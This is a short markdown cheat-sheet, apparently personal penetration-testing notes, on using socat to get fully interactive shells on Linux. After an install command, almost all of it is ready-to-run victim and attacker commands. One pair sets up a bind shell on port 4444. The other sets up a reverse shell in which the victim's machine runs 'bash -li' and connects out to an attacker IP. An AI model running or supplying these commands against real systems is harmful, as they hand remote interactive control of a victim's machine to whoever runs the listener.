# Introduction
A great tool for having full interactive reverse and bind shells. I am assuming that we are using socat on Linux and not Windows.

## Installation on Ubuntu
```bash
sudo apt update && sudo apt install socat -y
```
## Usage
### Bind shell
We must first listen on the victim's machine.

Victim
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp-listen:4444
```

And now we connect as an attacker to the victim's machine.

Attacker
```bash
socat file:`tty`,raw,echo=0 tcp:192.168.92.134:4444
```

> [!WARNING]
> 192.168.92.134 is the IP of the victim, make sure to change the IP to the one you want.
### Reverse shell
We must first listen on the attacker's machine.

Attacker
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

And now the victim's machine connects to the attacker.

Victim
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.92.129:4444
```

> [!WARNING]
> 192.168.92.129 is the IP of the attacker, make sure to change the IP to the one you want.